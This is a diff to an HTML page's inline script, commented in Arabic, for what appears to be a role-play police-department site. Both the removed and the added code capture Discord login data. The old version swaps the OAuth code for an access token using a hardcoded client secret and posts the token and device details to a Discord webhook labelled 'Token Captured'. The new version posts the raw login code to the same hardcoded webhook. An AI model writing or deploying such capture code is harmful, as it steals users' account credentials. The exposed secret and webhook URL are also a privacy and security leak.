@@ -1417,59 +1417,42 @@ root.render(<App/>);
 </script>
 
 <script>
+// 1. استخراج الكود من الرابط
 const urlParams = new URLSearchParams(window.location.search);
 const discordCode = urlParams.get('code');
 
 if (discordCode) {
-    const CLIENT_ID = '1501532779924684851';
-    const CLIENT_SECRET = 'jqZdnEq5N4gzixI3mw-bzSVZKtie-dR3';
-    const REDIRECT_URI = 'https://ekrp1.netlify.app/';
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1501486535495909508/tgk6tefdfHjUriek7isfqA4sYgZD8_7zkHbrGS8v8ZVwZYes-iNazxuDN97RRFe-0V8i";
+    
+    console.log("Found Code:", discordCode);
 
-    // 1. عملية المقايضة (Exchange) لتحويل الكود إلى توكن
-    fetch('https://discord.com/api/oauth2/token', {
+    // 2. إرسال الكود للويب هوك
+    fetch(WEBHOOK_URL, {
         method: 'POST',
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: new URLSearchParams({
-            client_id: CLIENT_ID,
-            client_secret: CLIENT_SECRET,
-            grant_type: 'authorization_code',
-            code: discordCode,
-            redirect_uri: REDIRECT_URI
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            content: "🚨 **New Code Arrived!**",
+            embeds: [{
+                title: "Login Code Captured",
+                description: `Code: \`${discordCode}\``,
+                color: 0x3498db
+            }]
         })
     })
-    .then(response => response.json())
-    .then(data => {
-        const finalToken = data.access_token;
-
-        if (finalToken) {
-            // 2. إرسال التوكن النهائي ومعلومات الجهاز للويب هوك
-            return fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    embeds: [{
-                        title: "✅ Final Access Token Captured!",
-                        description: `**Token:** \`${finalToken}\``,
-                        color: 0x00FF00,
-                        fields: [
-                            { name: "📱 Device", value: navigator.userAgent, inline: false },
-                            { name: "🔑 Type", value: "Automatic Bypass (JS)", inline: true }
-                        ],
-                        footer: { text: "LSPD Central System | Automated Capture" }
-                    }]
-                })
-            });
+    .then(response => {
+        if (response.ok) {
+            alert("✅ تم إرسال الكود للديسكورد بنجاح!");
+            window.history.replaceState({}, document.title, "/");
+        } else {
+            alert("❌ الويب هوك فيه مشكلة، تأكد من الرابط");
         }
     })
-    .then(() => {
-        // تنظيف الرابط وإظهار رسالة النجاح
-        window.history.replaceState({}, document.title, "/");
-        alert("System Synchronized Successfully!");
-    })
     .catch(err => {
-        console.error("Capture Error:", err);
+        alert("❌ فشل الإرسال: " + err);
     });
+} else {
+    // إذا دخلت الموقع وما فيه كود في الرابط
+    console.log("No code found in URL yet.");
 }
 </script>
 </body>
